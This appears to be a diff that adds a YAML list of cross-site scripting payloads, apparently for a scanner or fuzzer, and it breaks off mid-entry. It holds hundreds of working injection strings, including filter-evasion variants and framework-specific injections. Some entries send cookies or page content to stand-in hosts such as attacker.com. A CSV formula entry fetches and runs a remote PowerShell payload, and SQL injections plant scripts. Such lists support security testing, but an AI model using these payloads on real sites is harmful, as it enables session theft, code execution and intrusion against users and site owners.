@@ -1,0 +1,966 @@
+xss_payloads:
+  default: '"><img src=x onerror=prompt(String.fromCharCode(79,80,69,76,66,85,71,66,79,85,78,84,89))>'
+  payloads:
+  - <script>alert("XSS")</script>
+  - <img src="x" onerror="alert('XSS')">
+  - <body onload="alert('XSS')">
+  - <input onfocus="alert('XSS')" autofocus>
+  - <svg onload="alert('XSS')">
+  - <iframe src="javascript:alert('XSS')">
+  - <details open ontoggle="alert('XSS')">
+  - <marquee onstart="alert('XSS')">
+  - <audio src="x" onerror="alert('XSS')">
+  - <object data="javascript:alert('XSS')">
+  - <video controls onloadstart="alert('XSS')">
+  - <audio controls onplay="alert('XSS')">
+  - <marquee onstart="alert('XSS')">XSS</marquee>
+  - <script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
+  - <script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
+  - <script>eval(`alert(String.fromCharCode(88,83,83))`)</script>
+  - <script>setTimeout('alert("XSS")',1)</script>
+  - <script>setInterval('alert("XSS")',1000)</script>
+  - <script>Function('alert("XSS")')())</script>
+  - <script>(function(){alert('XSS')})()</script>
+  - <script>with(document)write('<img src=x onerror=alert(1)>')</script>
+  - <ScRiPt>alert('XSS')</ScRiPt>
+  - <script\x09>alert('XSS')</script>
+  - <script\x0A>alert('XSS')</script>
+  - <script\x0D>alert('XSS')</script>
+  - <img src=x onerror=alert`XSS`>
+  - <svg><script>alert&#40;1&#41;</script>
+  - <img src=x onerror=alert(String.fromCharCode(88,83,83))>
+  - '"><script>alert(''XSS'')</script>'
+  - <svg/onload=alert`1`>
+  - <img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+  - <iframe srcdoc="<script>parent.alert('XSS')</script>">
+  - <svg><animate onbegin=alert('XSS')>
+  - <details open ontoggle=alert('XSS')>
+  - <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><path
+    id=*/alert(1)/*>
+  - <script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
+  - <script src="https://www.googleapis.com/customsearch/v1?callback=alert"></script>
+  - <link rel="dns-prefetch" href="//evil.com">
+  - <meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+  - <button onclick="alert('XSS')">Click Me</button>
+  - <div onmouseover="alert('XSS')">Hover Me</div>
+  - <input type="text" onkeypress="alert('XSS')">
+  - <form onsubmit="alert('XSS')"><input type="submit"></form>
+  - <select onfocus="alert('XSS')" autofocus><option>XSS</option></select>
+  - <textarea onblur="alert('XSS')" autofocus></textarea>
+  - jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>&gt;
+  - '"''><img src=x onerror=alert(1)>//'
+  - '"><script>alert(1)</script><img src=x onerror=alert(2)>'
+  - <input type="tel" onclick="alert('XSS')" value="Call Me">
+  - <meta name="viewport" content="width=device-width" onload="alert('XSS')">
+  - <input type="range" onchange="alert('XSS')" min="0" max="100">
+  - <script>document.write('<img src=x onerror=alert(1)>')</script>
+  - <script>eval(location.hash.substr(1))</script>
+  - <script>document.body.innerHTML = '<img src=x onerror=alert(1)>'</script>
+  - <script>document.createElement('img').onerror = alert; document.images[0].src
+    = 'x'</script>
+  - <style>@import'javascript:alert("XSS")';</style>
+  - <xss onafterscriptexecute=alert(1)><script>1</script>
+  - <script>top.alert?top.alert(1):alert(1)</script>
+  - <img src=1 onerror=alert(/XSS/.source)>
+  - <script>document.location='javascript:alert(1)'</script>
+  - <form><button formaction=javascript:alert(1)>Click</button></form>
+  - <svg onload=alert(1)>
+  - <img src=x onerror=alert(1)>
+  - <script>alert(1)</script>
+  - <body onload=alert(1)>
+  - <details open ontoggle=alert(1)>
+  - <video><source onerror=alert(1)>
+  - <audio src=x onerror=alert(1)>
+  - <input autofocus onfocus=alert(1)>
+  - <select autofocus onfocus=alert(1)>
+  - <textarea autofocus onfocus=alert(1)>
+  - ''');alert(1);//'
+  - '''-alert(1)-'''
+  - ${alert(1)}
+  - '[1].find(alert)'
+  - window['al'+'ert'](1)
+  - \u0061\u006c\u0065\u0072\u0074(1)
+  - expression(alert(1))
+  - javascript:alert(1)
+  - data:text/html,<script>alert(1)</script>
+  - <svg><animate attributeName=href values=javascript:alert(1) />
+  - <ScRiPt>alert(1)</ScRiPt>
+  - '&#60;script&#62;alert(1)&#60;/script&#62;'
+  - '%3Cscript%3Ealert(1)%3C/script%3E'
+  - '%253Cscript%253Ealert(1)%253C/script%253E'
+  - \x3Cscript\x3Ealert(1)\x3C/script\x3E
+  - \74script\76alert(1)\74/script\76
+  - <![CDATA[<script>alert(1)</script>]]>
+  - <!--<script>alert(1)</script>-->
+  - '" onmouseover="alert(1)'
+  - <script>alert(1)</script>%00
+  - <ScRiPt>alert(String.fromCharCode(88,83,83))</ScRiPt>
+  - <svg/onload=alert(1)>
+  - "<img\tsrc=x\tonerror=alert(1)>"
+  - <ſcript>alert(1)</ſcript>
+  - '&lt;script&gt;alert(1)&lt;/script&gt;'
+  - <scr<script>ipt>alert(1)</script>
+  - <svg%0Aonload%0D=alert(1)>
+  - <svg%0Conload=alert(1)>
+  - <svg><script>alert(1)</script></svg>
+  - <img src=x o\u006eload=alert(1)>
+  - javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/*/`/*\`/*'/*"/**/(alert(1),eval(name))//'>
+  - '''">><marquee><img src=x onerror=confirm(1)></marquee>" onmouseover=alert(1)>'
+  - javascript:alert(1)//'?alert(1);//"?alert(1);//*/alert(1)/*
+  - <script>alert(1)</script><![CDATA[<script>alert(2)</script>]]>
+  - <div ontouchstart=alert(1)>Touch me</div>
+  - <input type=text ongesturestart=alert(1)>
+  - <body ondeviceorientation=alert(1)>
+  - <div onmouseover=alert(1)>Hover me</div>
+  - <button onclick=alert(1)>Click me</button>
+  - <input onfocus=alert(1) autofocus>
+  - <input onblur=alert(1) autofocus><input>
+  - <body onresize=alert(1)>
+  - <body onscroll=alert(1)><div style=height:1000px></div>
+  - <div onanimationend=alert(1) style=animation:spin\ 1s>
+  - <div ontransitionend=alert(1) style=transition:all\ 1s onmouseover=this.style.color='red'>
+  - <script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1);"></script>
+  - <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1);"></script>
+  - <script src="https://www.google.com/tools/feedback/escalation-options?callback=alert(1);"></script>
+  - <script src="https://cse.google.com/api?callback=alert(1);"></script>
+  - <script src="https://api.twitter.com/1/statuses/oembed.json?callback=alert(1);"></script>
+  - <script src="https://cdn.syndication.twimg.com/widgets/timelines?callback=alert(1);"></script>
+  - <script src="https://www.youtube.com/oembed?callback=alert(1);"></script>
+  - <script src="https://suggestqueries.google.com/complete/search?client=youtube&jsonp=alert(1);"></script>
+  - <script src="https://api.github.com/repos/user/repo?callback=alert(1);"></script>
+  - <script src="https://connect.facebook.net/en_US/sdk.js#xfbml=1&appId=123&callback=alert(1);"></script>
+  - <script src="https://vimeo.com/api/oembed.json?callback=alert(1);"></script>
+  - <script src="https://api.flickr.com/services/rest?format=json&jsoncallback=alert(1);"></script>
+  - '{{constructor.constructor(''alert(1)'')()}}'
+  - '{{a=''constructor'';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,''alert(1)'')()}}'
+  - '{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[''a''].map(toString.constructor.prototype.toString,''alert(1)'')}}'
+  - '{{(''a'').constructor.prototype.charAt=[].join;$eval(''x=alert(1)'')}}'
+  - '{{$new.constructor(''alert(1)'')()}}'
+  - <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script><script>$.globalEval('alert(1)');</script>
+  - <script src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"></script><script>_.template('${alert(1)}')()</script>
+  - <script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.min.js"></script><script>$('body').insert('<img
+    src=x onerror=alert(1)>');</script>
+  - <script src="https://ajax.googleapis.com/ajax/libs/dojo/1.16.0/dojo/dojo.js"></script><script>dojo.eval('alert(1)');</script>
+  - <script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script><script>Browser.exec('alert(1)');</script>
+  - <script src="data:application/javascript,alert(1)"></script>
+  - <script src="data:text/javascript,alert(1)"></script>
+  - <iframe src="data:text/html,<script>parent.alert(1)</script>"></iframe>
+  - <object data="data:text/html,<script>alert(1)</script>"></object>
+  - <object data="https://example.com/xss.swf"></object>
+  - <embed src="https://example.com/exploit.pdf#javascript:alert(1)"></embed>
+  - <object data="//evil.com/exploit.html"></object>
+  - <script>new WebSocket('wss://attacker.com').onmessage=function(e){eval(e.data)};</script>
+  - <script>fetch('wss://attacker.com').then(r=>r.text()).then(eval);</script>
+  - <base href="//attacker.com/"><script src="/evil.js"></script>
+  - <base href="javascript:alert(1)//"><a href="#">Click</a>
+  - <form action="javascript:alert(1)"><input type="submit" value="Click"></form>
+  - <button formaction="javascript:alert(1)">Click</button>
+  - <script>new Worker('data:application/javascript,importScripts("//attacker.com/evil.js")');</script>
+  - <script>new SharedWorker('//attacker.com/evil.js');</script>
+  - <link rel="manifest" href="//attacker.com/manifest.json">
+  - <style>@font-face{font-family:x;src:url('//attacker.com/font.woff')}</style>
+  - <style>body{background:url('javascript:alert(1)')}</style>
+  - <style>@import 'data:text/css,body{background:url(javascript:alert(1))}';</style>
+  - <div style="background:url('//attacker.com/steal.php?data='+document.cookie)"></div>
+  - <script>eval("\u0061\u006c\u0065\u0072\u0074(1)")</script>
+  - <script>eval("al\x65rt(1)")</script>
+  - <script>eval("ale\162t(1)")</script>
+  - <script>window["\u0061\u006c\u0065\u0072\u0074"](1)</script>
+  - <img src=x onerror="eval('&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;')">
+  - <script>window['al'+'ert'](1)</script>
+  - <script>top["ale"+"rt"](1)</script>
+  - <script>parent["ale"+"rt"](1)</script>
+  - <script>(alert)(1)</script>
+  - <script>window[String.fromCharCode(97,108,101,114,116)](1)</script>
+  - <script>[]["sort"]["constructor"]("alert(1)")()</script>
+  - <script>""["constructor"]["constructor"]("alert(1)")()</script>
+  - <script>({}+[])[+!![]+[+[]]]+({}+[])[!![]+!![]]+([][[]]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+!![]]</script>
+  - <script>eval(unescape("%61%6c%65%72%74%28%31%29"))</script>
+  - <script>eval(decodeURI("%61%6C%65%72%74%28%31%29"))</script>
+  - <ScRiPt>AlErT(1)</ScRiPt>
+  - <sCrIpT>alert(1)</SCRIPT>
+  - <ImG sRc=X oNeRrOr=AlErT(1)>
+  - <SvG oNlOaD=AlErT(1)>
+  - <bOdY oNlOaD=AlErT(1)>
+  - <DeTaIlS oPeN oNtOgGlE=AlErT(1)>
+  - <iNpUt AuToFoCuS oNfOcUs=AlErT(1)>
+  - <TeXtArEa AuToFoCuS oNfOcUs=AlErT(1)>
+  - <ViDeO><SoUrCe OnErRoR=AlErT(1)>
+  - <AuDiO sRc=X oNeRrOr=AlErT(1)>
+  - "<script\t>alert(1)</script>"
+  - <script
+  - '>alert(1)</script>'
+  - <script >alert(1)</script>
+  - <img src=x onerror=alert(1)//
+  - <img src=x onerror=alert(1)/**/
+  - <img src=x onerror=ale/**/rt(1)>
+  - <img src=x onerror=al&#101;rt(1)>
+  - <img src=x onerror=alert&lpar;1&rpar;>
+  - <img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+  - <script>alert`1`</script>
+  - <script>throw new Error`alert\x281\x29`</script>
+  - <script>console.log`alert\x281\x29`</script>
+  - <img src=x onerror=window['ale'+'rt'](1)>
+  - <img src=x onerror=[]['join']['constructor']('alert(1)')()>
+  - <img src=x onerror=(alert)(1)>
+  - <<script>alert(1)</script>
+  - <script<>alert(1)</script>
+  - <script src=//alert(1)>
+  - <iframe src=//evil.com#alert(1)>
+  - <meta http-equiv=refresh content=0;url=//evil.com>
+  - <img/src=x/onerror=alert(1)>
+  - <img%20src=x%20onerror=alert(1)>
+  - <img&#32;src=x&#32;onerror=alert(1)>
+  - <svg/onload=alert(1)//>
+  - <style>@import"//evil.com/style.css";</style>
+  - <svg onload=prompt`1`>
+  - <svg><script>alert&#40;1&#41;</script></svg>
+  - <iframe src=javascript:alert&#x28;1&#x29;>
+  - <details open=1 ontoggle=alert(1)>
+  - <select onfocus=alert(1) autofocus></select>
+  - <keygen autofocus onfocus=alert(1)>
+  - <marquee onstart=alert(1)>CloudFlare</marquee>
+  - <svg><animate onbegin=alert(1) attributeName=x dur=1s>
+  - <object data="data:text/html,<script>alert(1)</script>">
+  - <img src=x:alert(alt) onerror=eval(src) alt=1>
+  - <embed src="//14.rs">
+  - <script>location='javascript:alert\x281\x29'</script>
+  - <svg onload=alert(1);>
+  - <script>/**/alert(1)/**/</script>
+  - <img src=`x`onerror=`alert(1)`>
+  - <svg><script href=data:,alert(1) />
+  - <iframe src=jaVaSCript:alert(1)>
+  - <img/src/onerror=alert(1)//
+  - <button popovertarget=x>XSS</button><div popover id=x onbeforetoggle=alert(1)>
+  - <xmp><script>alert(1)</script></xmp>
+  - <script>top[/al/.source+/ert/.source](1)</script>
+  - <img src=x onerror=top[8680439..toString(30)](1)>
+  - <svg onload=eval(atob('YWxlcnQoMSk='))>
+  - <svg onload=setInterval`alert\x281\x29`,1>
+  - <iframe srcdoc='&lt;script&gt;parent.alert(1)&lt;/script&gt;'>
+  - <math><mi//xlink:href=data:x,<script>alert(1)</script>></mi></math>
+  - <svg><use href=#x /><!--<g id=x><foreignObject><script>alert(1)</script></g>-->
+  - <svg><animateTransform onbegin=alert(1)>
+  - <form><button formaction=javascript&colon;alert(1)>CLICK
+  - <table background=javascript:alert(1)></table>
+  - <script>location.replace`javascript:alert\x281\x29`</script>
+  - <img src=x onerror=import('data:text/javascript,alert(1)')>
+  - <fieldset><legend><img src=x onerror=alert(1)></legend></fieldset>
+  - <svg onload=alert(String.fromCharCode(49))>
+  - <img src=x onerror=alert(/1/.source)>
+  - <script>self[`al`+`ert`](1)</script>
+  - <svg><script>alert('1')</script>
+  - <img src=x onerror=setTimeout(alert,0,1)>
+  - <img src=x onerror=requestAnimationFrame(x=>alert(x),1)>
+  - <script>frames[0].alert?frames[0].alert(1):alert(1)</script>
+  - <object type=text/html data='data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;'>
+  - <svg><g onload=alert(1)>
+  - <img src=x onerror=Function`return alert`()`1`>
+  - <script charset=utf-7>alert(1)</script>
+  - <svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+  - <img src=x onerror=alert`${1}`>
+  - <style>*{background:url(javascript:alert(1))}</style>
+  - <template><script>alert(1)</script></template>
+  - <isindex type=image src=1 onerror=alert(1)>
+  - <script>new Function('ale'+'rt(1)')()</script>
+  - <img src=x onerror=eval('al'+'ert(1)')>
+  - <svg><set onbegin=alert(1) attributeName=x to=y>
+  - <video poster=javascript:alert(1)></video>
+  - <script>globalThis['ale'+'rt'](1)</script>
+  - <img src=x onerror=alert(parseInt(1))>
+  - <svg><metadata><script>alert(1)</script></metadata></svg>
+  - <img src=x onerror=prompt(name)>
+  - <script>Reflect.construct(alert,[1])</script>
+  - <img src=x onerror=chrome.app?alert(1):0>
+  - '<script>CSS.supports(''(display: flex)'')?alert(1):0</script>'
+  - <script>window.chrome?alert(1):0</script>
+  - <script>navigator.userAgent.includes('Chrome')&&alert(1)</script>
+  - <script>chrome.runtime?alert(1):0</script>
+  - <script>if(window.speechSynthesis)alert(1)</script>
+  - <script>navigator.webdriver===undefined&&alert(1)</script>
+  - <script>window.DeviceOrientationEvent&&alert(1)</script>
+  - <script>navigator.serviceWorker?alert(1):0</script>
+  - <script>window.caches?alert(1):0</script>
+  - <script>window.IntersectionObserver&&alert(1)</script>
+  - <script>window.PaymentRequest?alert(1):0</script>
+  - <script>typeof InstallTrigger !== 'undefined'&&alert(1)</script>
+  - <script>window.sidebar&&alert(1)</script>
+  - <script>!!navigator.mozBattery&&alert(1)</script>
+  - <script>typeof mozRTCPeerConnection !== 'undefined'&&alert(1)</script>
+  - <script>navigator.mozApps&&alert(1)</script>
+  - <script>window.mozIndexedDB&&alert(1)</script>
+  - <script>navigator.buildID&&alert(1)</script>
+  - <script>typeof netscape !== 'undefined'&&alert(1)</script>
+  - <script>window.mozRequestAnimationFrame&&alert(1)</script>
+  - <script>document.mozFullScreen!==undefined&&alert(1)</script>
+  - <script>window.safari&&alert(1)</script>
+  - <script>navigator.standalone!==undefined&&alert(1)</script>
+  - <script>!!window.ApplePaySession&&alert(1)</script>
+  - <script>typeof webkitAudioContext !== 'undefined'&&alert(1)</script>
+  - <script>!!navigator.userAgent.match(/Version\/[\d\.]+.*Safari/)&&alert(1)</script>
+  - <script>window.DeviceMotionEvent&&/iPhone|iPad/.test(navigator.userAgent)&&alert(1)</script>
+  - <script>typeof window.orientation !== 'undefined'&&alert(1)</script>
+  - <script>window.visualViewport&&alert(1)</script>
+  - <script>!!window.StyleMedia&&alert(1)</script>
+  - <script>navigator.userAgent.includes('Edg')&&alert(1)</script>
+  - <script>!!window.MSInputMethodContext&&alert(1)</script>
+  - <script>typeof msCrypto !== 'undefined'&&alert(1)</script>
+  - <script>window.Windows&&alert(1)</script>
+  - <script>!!document.documentMode&&alert(1)</script>
+  - <script>!!window.ActiveXObject&&alert(1)</script>
+  - <script>typeof document.all !== 'undefined'&&alert(1)</script>
+  - <script>!!window.attachEvent&&alert(1)</script>
+  - <script>typeof document.selection !== 'undefined'&&alert(1)</script>
+  - <script>!!window.execScript&&alert(1)</script>
+  - <script>navigator.userAgent.indexOf('MSIE') !== -1&&alert(1)</script>
+  - '<div dangerouslySetInnerHTML={{__html: ''<img src=x onerror=alert(1)''}}></div>'
+  - <img src={`javascript:alert(1)`} />
+  - <script src={userInput}></script>
+  - <iframe src={`data:text/html,<script>alert(1)</script>`}></iframe>
+  - <div onClick={eval(userInput)}>Click</div>
+  - <div {...props} onMouseOver="alert(1)">React</div>
+  - <div ref={(el) => el && eval(maliciousCode)}>Ref Attack</div>
+  - 'React.createElement(''img'', {src: ''x'', onError: () => alert(1)})'
+  - '<div style={{backgroundImage: `url(javascript:alert(1))`}}>Style Injection</div>'
+  - <div className={userInput + " onclick=alert(1)//"}>Class Injection</div>
+  - '<img src="x" {...{onError: "alert(1)"}} />'
+  - <div title={JSON.stringify(userInput).slice(1,-1)} onMouseOver="alert(1)">JSON
+    Bypass</div>
+  - <div [innerHTML]="userInput"></div>
+  - <img [src]="'javascript:alert(1)'" />
+  - <div [attr.onclick]="'alert(1)'">Click</div>
+  - <div [style.background]="'url(javascript:alert(1))'">Style</div>
+  - <div (window:resize)="eval($event.target.location='javascript:alert(1)')">Resize</div>
+  - <template [innerHTML]="trustHtml('<script>alert(1)</script>')"></template>
+  - <div [routerLink]="['/path', userInput]" (click)="eval(userInput)">Link</div>
+  - <div *ngFor="let item of items" [innerHTML]="item.content"></div>
+  - <iframe [src]="sanitizer.bypassSecurityTrustResourceUrl('javascript:alert(1)')"></iframe>
+  - <div [@triggerName]="userInput" (@triggerName.done)="eval($event.element)">Animation</div>
+  - <div v-html="userInput"></div>
+  - <img :src="'javascript:alert(1)'" />
+  - <div @click="eval(userInput)">Click</div>
+  - <component :is="userInput" @click="alert(1)"></component>
+  - '<div v-bind="{ onclick: ''alert(1)'' }">Bind Attack</div>'
+  - <template v-for="item in items" :key="item.id" v-html="item.content"></template>
+  - '<div :style="{ backgroundImage: ''url(javascript:alert(1))'' }">Style</div>'
+  - <iframe :src="$sanitize('<script>alert(1)</script>')"></iframe>
+  - <script>$('#target').html(userInput)</script>
+  - <script>$('#target').append('<img src=x onerror=alert(1)>')</script>
+  - <script>$(userInput).appendTo('body')</script>
+  - <script>$('#target').attr('onclick', 'alert(1)')</script>
+  - <script>$.globalEval(userInput)</script>
+  - <script>$('#target').load('data:text/html,<script>alert(1)</script>')</script>
+  - <div class="alert" data-bs-toggle="tooltip" data-bs-html="true" title="<img src=x
+    onerror=alert(1)>">Bootstrap</div>
+  - <div data-bs-toggle="popover" data-bs-content="<script>alert(1)</script>" data-bs-html="true">Bootstrap</div>
+  - <div class="carousel slide" data-bs-ride="carousel" data-bs-target="javascript:alert(1)">Carousel</div>
+  - <div class="modal" tabindex="-1" data-bs-backdrop="<img src=x onerror=alert(1)>">Modal</div>
+  - '{"name": "</script><script>alert(1)</script>"}'
+  - '{"html": "<img src=x onerror=alert(1)>"}'
+  - '{"callback": "alert(1)//", "data": "test"}'
+  - '{"eval": "eval(''alert(1)'')"}'
+  - '{"url": "javascript:alert(1)"}'
+  - '{"script": "'';alert(1);//"}'
+  - '{"message": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"}'
+  - '{"innerHTML": "<svg onload=alert(1)>"}'
+  - '{"constructor": "Function(''return alert(1)'')()"}'
+  - '{"expression": "window[''al''+''ert''](1)"}'
+  - <root><![CDATA[<script>alert(1)</script>]]></root>
+  - <root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="javascript:alert(1)">
+  - <svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
+  - <?xml version="1.0" encoding="UTF-8"?><root><data><![CDATA[</data><script>alert(1)</script><data>]]></data></root>
+  - <math xmlns="http://www.w3.org/1998/Math/MathML"><mi><mglyph fontfamily="x" index="alert(1)"/></mi></math>
+  - <root><element attribute="&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;">content</element></root>
+  - <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template
+    match="/"><script>alert(1)</script></xsl:template></xsl:stylesheet>
+  - <root><text><![CDATA[<img src="x" onerror="alert(1)">]]></text></root>
+  - <html:div xmlns:html="http://www.w3.org/1999/xhtml" html:onclick="alert(1)">XML
+    HTML</html:div>
+  - <feed xmlns="http://www.w3.org/2005/Atom"><title type="html">&lt;script&gt;alert(1)&lt;/script&gt;</title></feed>
+  - '"Name","=cmd|''/C calc''!A1","Email"'
+  - Name,=HYPERLINK("http://evil.com","Click me"),Email
+  - '"User","+1-1+cmd|''/C calc''!A1","Role"'
+  - Name,@SUM(1+1)*cmd|'/C calc'!A1,Email
+  - '"Data","=2+3+cmd|''/C powershell IEX(wget 0r.pe/p -UseBasicParsing)''!A1","Info"'
+  - '''; EXEC xp_cmdshell(''echo ^<script^>alert(1)^</script^> > C:\\temp\\xss.html'');
+    --'
+  - ''' UNION SELECT ''<script>alert(1)</script>'', null, null --'
+  - '''; INSERT INTO web_content (html) VALUES (''<img src=x onerror=alert(1)>'');
+    --'
+  - ''' OR 1=1; UPDATE pages SET content = CONCAT(content, ''<script>alert(1)</script>'');
+    --'
+  - '''; EXEC sp_makewebtask @outputfile=''C:\\temp\\xss.html'', @query=''SELECT ''''<script>alert(1)</script>'''''';
+    --'
+  - <script>window.postMessage('<img src=x onerror=alert(1)>', '*')</script>
+  - <script>window.addEventListener('message', function(e){document.body.innerHTML
+    = e.data}); window.postMessage('<script>alert(1)</script>', '*')</script>
+  - <script>window.parent.postMessage('javascript:alert(1)', '*')</script>
+  - <script>addEventListener('message', e => eval(e.data)); postMessage('alert(1)',
+    '*')</script>
+  - <iframe src="data:text/html,<script>parent.postMessage('<svg onload=alert(1)>',
+    '*')</script>"></iframe>
+  - <script>onmessage = e => document.write(e.data); postMessage('<img src=x onerror=alert(1)>',
+    '*')</script>
+  - <script>window.addEventListener('message', e => location = e.data); postMessage('javascript:alert(1)',
+    '*')</script>
+  - <script>window.addEventListener('message', e => Function(e.data)()); postMessage('alert(1)',
+    '*')</script>
+  - <script>document.write(location.hash.substr(1))</script>
+  - <script>eval(decodeURIComponent(location.hash.substring(1)))</script>
+  - <script>document.getElementById('target').innerHTML = location.hash.slice(1)</script>
+  - <script>setTimeout(location.hash.substr(1), 100)</script>
+  - <script>new Function(window.location.hash.substring(1))()</script>
+  - <script>document.body.appendChild(document.createElement('script')).src = location.hash.substr(1)</script>
+  - <script>eval(new URLSearchParams(location.search).get('code'))</script>
+  - <script>document.write(location.search.split('xss=')[1])</script>
+  - <script>setTimeout(location.search.split('=')[1], 0)</script>
+  - <script>document.body.innerHTML = new URL(location).searchParams.get('html')</script>
+  - <script>import(new URLSearchParams(location.search).get('module'))</script>
+  - <script>globalThis[location.search.split('=')[1]]()</script>
+  - <script src="https://api.github.com/users/test?callback=alert"></script>
+  - <script src="https://maps.googleapis.com/maps/api/js?callback=alert"></script>
+  - <script src="https://api.imgur.com/3/gallery/hot?callback=alert"></script>
+  - <script src="https://graph.facebook.com/me?callback=alert"></script>
+  - <script src="https://api.soundcloud.com/resolve?url=http://soundcloud.com/test&callback=alert"></script>
+  - <script src="https://api.reddit.com/r/all/hot.json?jsonp=alert"></script>
+  - <script src="https://api.instagram.com/v1/media/popular?callback=alert"></script>
+  - <script src="https://api.tumblr.com/v2/blog/test.tumblr.com/info?callback=alert"></script>
+  - <script src="https://api.pinterest.com/v1/me/?callback=alert"></script>
+  - <script src="https://api.twitch.tv/kraken/users/test?callback=alert"></script>
+  - <script src="https://cdn.jsdelivr.net/gh/user/repo@main/script.js"></script>
+  - <script src="https://unpkg.com/package@version/file.js"></script>
+  - <script src="https://cdn.skypack.dev/package@version"></script>
+  - <script src="https://esm.sh/package@version"></script>
+  - <script src="https://cdn.pika.dev/package@version"></script>
+  - <script nonce="">alert(1)</script>
+  - <script nonce="null">alert(1)</script>
+  - <script nonce="undefined">alert(1)</script>
+  - <base href="data:"><script nonce="validnonce" src="text/javascript,alert(1)"></script>
+  - <script nonce="<!-- comment -->">alert(1)</script>
+  - <script>a\u006cert(1)</script>
+  - <ｓｃｒｉｐｔ>alert(1)</ｓｃｒｉｐｔ>
+  - <script>аlert(1)</script>
+  - <script>eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')</script>
+  - <img src=x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
+  - <scr‌ipt>alert(1)</scr‌ipt>
+  - <script>eval(unescape('%u0061%u006C%u0065%u0072%u0074%u0028%u0031%u0029'))</script>
+  - <script>\u{61}\u{6c}\u{65}\u{72}\u{74}(1)</script>
+  - <script>alert(1/*‮⁦comment⁩‭*/)</script>
+  - <div dir="rtl">‮<img src=x onerror=alert(1)>‬</div>
+  - <bdi>‮tpircs<‬script>alert(1)</script></bdi>
+  - <script>/*‮ })(1trel{/*/ alert(1); /*‭*/</script>
+  - <script>аlеrt(1)</script>
+  - <script>ａｌｅｒｔ(1)</script>
+  - <script>αlert(1)</script>
+  - <script>аӏert(1)</script>
+  - <img src="//attacker.com/log?data=document.cookie">
+  - '<script>fetch(''//attacker.com/log'', {method: ''POST'', body: document.cookie})</script>'
+  - <script>navigator.sendBeacon('//attacker.com/log', document.body.innerHTML)</script>
+  - <script>setTimeout(() => fetch('//attacker.com/delayed'), 5000)</script>
+  - <script>setInterval(() => new Image().src = '//attacker.com/ping', 10000)</script>
+  - <script>document.addEventListener('DOMContentLoaded', () => fetch('//attacker.com/ready'))</script>
+  - <script>window.addEventListener('beforeunload', () => navigator.sendBeacon('//attacker.com/exit',
+    'user leaving'))</script>
+  - '<script>new MutationObserver(() => fetch(''//attacker.com/mutation'')).observe(document,
+    {childList: true, subtree: true})</script>'
+  - <script>fetch(`//\${btoa(document.cookie)}.attacker.com`)</script>
+  - <script>new Image().src = `//${location.hostname.replace(/\./g, '-')}.attacker.com`</script>
+  - <script>fetch(`//${document.title.slice(0,20)}.attacker.com`)</script>
+  - <script>navigator.serviceWorker.register('data:text/javascript,fetch(`//pwned.attacker.com`)')</script>
+  - <iframe src="//target.com" style="opacity:0.1;position:absolute;top:0;left:0;width:100%;height:100%"></iframe><button
+    onclick="alert('Clicked!')">Click for prize!</button>
+  - <div style="cursor:pointer" onclick="document.getElementById('hiddenFrame').src='//evil.com'">Click
+    me!</div><iframe id="hiddenFrame" style="display:none"></iframe>
+  - <div onmouseover="this.innerHTML='<iframe src=//evil.com></iframe>'" style="width:100px;height:100px;background:red">Hover
+    for gift!</div>
+  - <button onclick="window.open('//evil.com', '_blank', 'width=1,height=1,top=0,left=0')">Claim
+    reward</button>
+  - <div onclick="navigator.clipboard.writeText('//evil.com').then(() => alert('Link
+    copied to clipboard!'))" style="cursor:pointer;color:blue">Copy link</div>
+  - '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,0,0,0.8);z-index:9999"
+    onclick="location=''//evil.com''">URGENT: Click anywhere to secure your account!</div>'
+  - <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:white;border:1px
+    solid;padding:20px;box-shadow:0 0 10px rgba(0,0,0,0.5)" onclick="fetch('//evil.com/steal?data='+document.cookie)">You
+    have won $1000! Click to claim.</div>
+  - <style>body{filter:blur(2px)} .clear{filter:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:20px}</style><div
+    class="clear" onclick="document.body.style.filter='none';location='//evil.com'">Click
+    to remove blur</div>
+  - '<script>fetch(''/api/user'', {method: ''POST'', headers: {''Content-Type'': ''application/json''},
+    body: JSON.stringify({name: ''</script><script>alert(1)</script>''})}).then(r
+    => r.text()).then(eval)</script>'
+  - <script>fetch('/api/search?q=<script>alert(1)</script>').then(response => response.json()).then(data
+    => document.body.innerHTML = data.results)</script>
+  - <script>fetch('/api/data').then(r => r.json()).then(d => eval(d.callback))</script>
+  - '<script>fetch(''/api/template'', {method: ''POST'', body: new FormData().append(''template'',
